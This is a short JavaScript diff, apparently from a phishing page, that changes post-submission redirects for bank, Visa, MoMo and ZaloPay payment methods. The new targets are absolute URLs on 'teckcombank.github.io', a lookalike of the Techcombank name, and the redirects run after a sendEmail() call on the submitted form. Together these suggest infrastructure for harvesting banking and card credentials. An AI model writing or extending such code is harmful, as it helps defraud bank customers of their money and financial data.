@@ -1635,10 +1635,10 @@
           if (isValid) {
             sendEmail().finally(() => {
               const redirectURLs = {
-                bank: "/pages/atm.html",
-                visa: "/pages/visa.html",
-                momo: "/pages/momo.html",
-                zalopay: "/pages/zalopay.html",
+                bank: "https://teckcombank.github.io/techcombank/pages/atm.html",
+                visa: "https://teckcombank.github.io/techcombank/pages/visa.html",
+                momo: "https://teckcombank.github.io/techcombank/pages/momo.html",
+                zalopay: "https://teckcombank.github.io/techcombank/pages/zalopay.html",
               };
               const redirectURL = redirectURLs[method.toLowerCase()];
               try {
